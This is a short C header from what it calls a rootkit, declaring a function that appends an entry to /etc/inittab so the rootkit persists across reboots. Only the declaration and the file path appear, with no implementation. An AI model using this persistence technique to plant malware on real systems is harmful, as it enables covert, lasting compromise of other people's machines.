/**
 * @file persistance.h
 * 
 * @brief Definitions to setup the rootkit persistance
 * 
 */

#ifndef _RK_PERSISTANCE_H
#define _RK_PERSISTANCE_H


#define INITTAB_PATH "/etc/inittab"

/**
 * @brief add entry to /etc/inittab
 * 
 * This function add an entry to the inittab configuration file
 * 
 * @return 0 on success, error code on failure
 */

int  append_in_inittab(void);

#endif // _RK_PERSISTANCE_H